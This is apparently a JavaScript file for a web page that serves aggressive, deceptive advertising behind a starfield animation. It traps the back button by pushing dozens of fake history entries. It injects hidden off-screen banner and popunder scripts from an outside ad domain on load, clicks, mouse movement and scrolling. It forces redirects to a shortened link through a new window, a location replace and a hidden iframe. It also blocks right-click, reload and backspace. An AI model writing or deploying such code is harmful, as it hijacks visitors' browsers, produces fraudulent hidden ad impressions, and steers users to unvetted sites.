// ====== BRUTAL ADS CONFIGURATION ======
const BANNER_SCRIPT = `
<script type="text/javascript">
	atOptions = {
		'key' : '4b1eafbbf9404932effcedf29b70c2c7',
		'format' : 'iframe',
		'height' : 250,
		'width' : 300,
		'params' : {}
	};
</script>
<script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>
`;

const POPUNDER_SCRIPT = '<script type="text/javascript" src="//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b591.js"></script>';

const HISTORY_PUSH_COUNT = 50;

// ====== BRUTAL INITIALIZATION ======
window.addEventListener('load', function() {
  brutalPushStates(HISTORY_PUSH_COUNT);
  createStars();
  createShootingStars();
  createCosmicRays();
  initializeBrutalButtons();
  
  // Pre-load ads immediately
  preloadAllAds();
  
  // Aggressive popunder on load
  setTimeout(triggerPopunder, 1500);
  
  // Continuous popunder attempts
  setInterval(triggerPopunder, 30000);
  
  // Mouse movement detection for ads
  document.addEventListener('mousemove', handleMouseMovement);
  
  // Scroll detection for ads
  window.addEventListener('scroll', handleScroll);
  
  // Prevent right click
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    triggerEmergencyAds();
  });
});

// ====== BRUTAL HISTORY MANAGEMENT ======
function brutalPushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({brutal: i, trap: true}, "", "#" + i); 
    } catch(e) { 
      console.log('Brutal push state blocked'); 
    }
  }
  
  history.replaceState({trapped: true}, "", window.location.href);
}

// ====== BRUTAL POPSTATE HANDLER ======
window.addEventListener('popstate', function(event) {
  brutalPushStates(50);
  triggerEmergencyAds();
  
  setTimeout(() => {
    openBrutalRedirect();
  }, 100);
});

// ====== BRUTAL BUTTON HANDLING ======
function initializeBrutalButtons() {
  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
    button.replaceWith(button.cloneNode(true));
  });

  document.querySelectorAll('a[data-ad="banner"]').forEach(button => {
    button.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      createRipple(this, e);
      createStarburst(this);
      
      // Multiple triggers on single click
      triggerBannerAds(3); // Trigger 3x banner ads
      triggerPopunder();
      brutalPushStates(25);
      
      setTimeout(() => {
        openBrutalRedirect();
      }, 500);
      
      return false;
    });
    
    button.addEventListener('touchstart', function(e) {
      e.preventDefault();
      triggerBannerAds(2);
      triggerPopunder();
    });
  });
}

// ====== BRUTAL AD TRIGGERS ======
function triggerBannerAds(count = 1) {
  for (let i = 0; i < count; i++) {
    const adContainer = document.createElement('div');
    adContainer.style.cssText = 'position:fixed; top:-1000px; left:-1000px; width:300px; height:250px; z-index:9999;';
    adContainer.innerHTML = BANNER_SCRIPT;
    
    document.body.appendChild(adContainer);
    
    setTimeout(() => {
      if (adContainer.parentNode) {
        adContainer.parentNode.removeChild(adContainer);
      }
    }, 10000);
  }
}

function triggerPopunder() {
  try {
    const script = document.createElement('script');
    script.innerHTML = POPUNDER_SCRIPT;
    document.head.appendChild(script);
  } catch (e) {
    console.log('Popunder blocked');
  }
}

function triggerEmergencyAds() {
  triggerBannerAds(5);
  triggerPopunder();
  brutalPushStates(50);
}

// ====== BRUTAL REDIRECT ======
function openBrutalRedirect() {
  try {
    const newWindow = window.open('https://shorter.me/WHO7C', '_blank');
    if (newWindow) {
      setTimeout(() => {
        newWindow.focus();
      }, 100);
    }
  } catch (e) {}
  
  try {
    setTimeout(() => {
      window.location.replace('https://shorter.me/WHO7C');
    }, 1500);
  } catch (e) {}
  
  try {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://shorter.me/WHO7C';
    document.body.appendChild(iframe);
  } catch (e) {}
}

// ====== PRELOAD ADS ======
function preloadAllAds() {
  const preloadDiv = document.createElement('div');
  preloadDiv.style.display = 'none';
  preloadDiv.innerHTML = BANNER_SCRIPT;
  document.getElementById('hiddenAds').appendChild(preloadDiv);
}

// ====== USER BEHAVIOR DETECTION ======
let mouseMoveCount = 0;
function handleMouseMovement(e) {
  mouseMoveCount++;
  
  if (mouseMoveCount % 50 === 0) {
    triggerBannerAds(1);
  }
  
  if (e.clientY < 100) {
    triggerPopunder();
  }
}

let scrollCount = 0;
function handleScroll() {
  scrollCount++;
  
  if (scrollCount % 10 === 0) {
    triggerBannerAds(1);
  }
}

// ====== GALAXY BACKGROUND EFFECTS ======
function createStars() {
  const container = document.querySelector('.stars-container');
  const starCount = 150;

  for (let i = 0; i < starCount; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    
    const size = Math.random() * 2 + 1;
    star.style.width = size + 'px';
    star.style.height = size + 'px';
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 100 + 'vh';
    star.style.animationDelay = Math.random() * 4 + 's';
    star.style.opacity = Math.random() * 0.7 + 0.3;
    
    container.appendChild(star);
  }
}

function createShootingStars() {
  const container = document.querySelector('.shooting-stars');

  function createShootingStar() {
    const star = document.createElement('div');
    star.className = 'shooting-star';
    
    star.style.left = Math.random() * 100 + 'vw';
    star.style.top = Math.random() * 50 + 'vh';
    star.style.animationDelay = Math.random() * 5 + 's';
    
    container.appendChild(star);
    
    setTimeout(() => {
      star.remove();
    }, 3000);
  }

  for (let i = 0; i < 3; i++) {
    setTimeout(createShootingStar, i * 1500);
  }

  setInterval(createShootingStar, 3000);
}

function createCosmicRays() {
  const container = document.querySelector('.cosmic-rays');

  function createRay() {
    const ray = document.createElement('div');
    ray.className = 'cosmic-ray';
    
    ray.style.left = Math.random() * 100 + 'vw';
    ray.style.animationDelay = Math.random() * 6 + 's';
    
    container.appendChild(ray);
    
    setTimeout(() => {
      ray.remove();
    }, 6000);
  }

  for (let i = 0; i < 6; i++) {
    setTimeout(createRay, i * 1000);
  }

  setInterval(createRay, 4000);
}

// ====== VISUAL EFFECTS ======
function createRipple(element, event) {
  const rect = element.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  
  const ripple = document.createElement('span');
  ripple.className = 'ripple';
  ripple.style.left = x + 'px';
  ripple.style.top = y + 'px';
  
  element.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}

function createStarburst(button) {
  const rect = button.getBoundingClientRect();
  const centerX = rect.left + rect.width / 2;
  const centerY = rect.top + rect.height / 2;
  
  const colors = ['#ff6b9d', '#ff4b7d', '#c74bd7', '#d8a8ff', '#ff9ec0'];
  
  for (let i = 0; i < 10; i++) {
    const particle = document.createElement('div');
    const angle = (i * 36) * Math.PI / 180;
    const distance = 60;
    
    particle.style.position = 'fixed';
    particle.style.width = '4px';
    particle.style.height = '4px';
    particle.style.backgroundColor = colors[i % colors.length];
    particle.style.borderRadius = '50%';
    particle.style.left = centerX + 'px';
    particle.style.top = centerY + 'px';
    particle.style.zIndex = '100';
    particle.style.pointerEvents = 'none';
    particle.style.boxShadow = `0 0 8px ${colors[i % colors.length]}`;
    
    document.body.appendChild(particle);
    
    const animation = particle.animate([
      { 
        transform: 'translate(0, 0) scale(1)', 
        opacity: 1 
      },
      { 
        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, 
        opacity: 0 
      }
    ], {
      duration: 600,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });
    
    animation.onfinish = () => particle.remove();
  }
}

// ====== AUTO TRIGGERS ======
setInterval(() => {
  if (Math.random() > 0.7) {
    triggerBannerAds(1);
  }
}, 15000);

// ====== BRUTAL EXIT PREVENTION ======
window.addEventListener('beforeunload', function(e) {
  triggerEmergencyAds();
  e.preventDefault();
  e.returnValue = 'Are you sure you want to leave?';
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
    e.preventDefault();
    triggerEmergencyAds();
  }
  
  if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
    e.preventDefault();
    brutalPushStates(10);
  }
});

